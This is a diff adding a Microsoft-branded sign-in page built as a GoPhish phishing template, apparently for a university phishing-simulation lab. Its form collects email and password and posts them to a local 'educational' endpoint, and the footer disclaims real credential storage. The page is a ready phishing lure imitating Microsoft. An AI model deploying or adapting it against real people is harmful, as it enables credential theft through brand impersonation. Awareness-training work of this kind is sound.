@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account - Microsoft Online</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+            background: linear-gradient(135deg, #eef2f5 0%, #d8e2ec 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: #1b1b1b;
+        }
+        .login-card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 440px;
+            padding: 44px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            border-radius: 2px;
+        }
+        .ms-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .ms-grid {
+            display: grid;
+            grid-template-columns: 10px 10px;
+            grid-gap: 2px;
+        }
+        .ms-grid div {
+            width: 10px;
+            height: 10px;
+        }
+        .red { background-color: #f25022; }
+        .green { background-color: #7fba00; }
+        .blue { background-color: #00a4ef; }
+        .yellow { background-color: #ffb900; }
+        .logo-text {
+            font-size: 19px;
+            font-weight: 600;
+            color: #737373;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: #1b1b1b;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #444;
+            margin-bottom: 24px;
+        }
+        .input-group {
+            margin-bottom: 16px;
+        }
+        input[type="text"], input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 10px 0;
+            border: none;
+            border-bottom: 1px solid #666;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            border-bottom: 2px solid #0067b8;
+        }
+        .form-links {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            margin-top: 14px;
+        }
+        .form-links a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        .form-links a:hover {
+            text-decoration: underline;
+        }
+        .btn-submit {
+            background-color: #0067b8;
+            color: #ffffff;
+            border: none;
+            padding: 10px 32px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 28px;
+            float: right;
+            border-radius: 2px;
+        }
+        .btn-submit:hover {
+            background-color: #005da6;
+        }
+        .footer-note {
+            margin-top: 70px;
+            font-size: 11px;
+            color: #8c8c8c;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <div class="ms-logo">
+            <div class="ms-grid">
+                <div class="red"></div>
+                <div class="green"></div>
+                <div class="blue"></div>
+                <div class="yellow"></div>
+            </div>
+            <span class="logo-text">Microsoft</span>
+        </div>
+        <h1>Sign in</h1>
+        <p class="subtitle">to retain domain SSO credentials & verify identity</p>
+
+        <!-- Form posts to GoPhish listener or local educational interceptor -->
+        <form action="/landing/educational" method="POST" id="phishForm">
+            <div class="input-group">
+                <input type="email" name="username" id="username" placeholder="Email, phone, or Skype" value="{{.Email}}" required autocomplete="off">
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" id="password" placeholder="Password" required autocomplete="off">
+            </div>
+            <div class="form-links">
+                <a href="#">No account? Create one!</a>
+                <a href="#">Can't access your account?</a>
+            </div>
+            <button type="submit" class="btn-submit">Sign in</button>
+        </form>
+
+        <div style="clear: both;"></div>
+        <div class="footer-note">
+            Controlled Academic Simulation Lab | No real credentials stored | Department of Information Technology
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('phishForm').addEventListener('submit', function(e) {
+            // For testing in web apps, prevent actual transmission of real passwords
+            console.log("[ETHICAL LAB INTERCEPT] Credential submission detected. No password logged.");
+        });
+    </script>
+</body>
+</html>
